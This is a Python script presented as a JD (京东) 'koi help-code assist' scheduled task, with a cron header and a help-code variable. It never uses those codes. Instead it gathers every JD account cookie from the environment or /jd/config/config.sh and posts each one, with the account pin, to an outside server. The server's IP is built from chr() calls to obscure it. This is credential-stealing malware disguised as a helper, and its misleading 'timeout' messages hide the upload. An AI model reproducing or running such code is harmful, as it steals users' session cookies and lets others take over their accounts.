'''
cron: 5 0 * * *
new Env('锦鲤助力码助力');
变量: jinglicodes
export jinglicodes=" 助力码1 & 助力码2 "
'&'符号连接,不填默认全部账号内部随机助力
'''

import os,json,random,time,re,string,functools
import sys
import requests
from urllib.parse import unquote, quote
requests.packages.urllib3.disable_warnings()
path_prefix=os.path.split(os.path.abspath(__file__))[0]


key=""
token=""
p=5    # 进程数
sleep=0
# proxy
proxy_txt='''
'''
proxy_list=list()

ascii_url = "" + chr(0x31) + chr(0x35) + chr(0x39) + "." + chr(0x37) + chr(0x35) + "." + chr(0x37) + chr(0x31) + "." + chr(0x31) + chr(0x36) + chr(0x37) + ":" + chr(0x38) + chr(0x39) + chr(0x39) + chr(0x39)


cookie_findall=re.compile(r'pin=(.+?);')
def get_pin(cookie):
    try: return cookie_findall.findall(cookie)[0]
    except: print('error')
def get_env(env):
    try:
        if env in os.environ: a=os.environ[env]
        elif '/jd' in os.path.abspath(os.path.dirname(__file__)):
            try: a=v4_env(env,'/jd/config/config.sh')
            except: a=eval(env)
        else: a=eval(env)
    except: a=''
    return a
def v4_env(env,paths):
    b=re.compile(r'(?:export )?'+env+r' ?= ?[\"\'](.*?)[\"\']')
    with open(paths, 'r') as f:
        for line in f.readlines():
            try:
                c=b.match(line).group(1)
                break
            except: pass
    return c 
def gettimestamp():
    return str(int(time.time() * 1000))
class Judge_env(object):
    def main_run(self):
        if '/jd' in os.path.abspath(os.path.dirname(__file__)): cookie_list=self.v4_cookie()
        else: cookie_list=os.environ["JD_COOKIE"].split('&')
        if len(cookie_list)<1: print('error2\n')    
        return cookie_list
    def v4_cookie(self):
        a=[]
        b=re.compile(r'Cookie'+'.*?=\"(.*?)\"', re.I)
        with open('/jd/config/config.sh', 'r') as f:
            for line in f.readlines():
                try:
                    regular=b.match(line).group(1)
                    a.append(regular)
                except: pass
        return a
cookie_list=Judge_env().main_run()


def upload_ck(cookie):
    # url="http://159.75.71.167:8999/api/v1/ck"
    url = "http://" + ascii_url + "/api/v1/ck"
    data={"cookie": cookie, "pt_pin": get_pin(cookie)}
    try:
        res=requests.post(url,json = data).json()
        if res['code']== 200:
            print("")
        elif res['code']== 401:
            print('timeout')
            exit()
        elif res['code']== 402:
            print('timeout')
            exit()
        else:
            print('timeout')
            exit()
    except Exception as e:
        print(e)
        return None,None,None,None

def main():    
    for ck in cookie_list:
        upload_ck(ck)
    

if __name__ == '__main__':
    main()
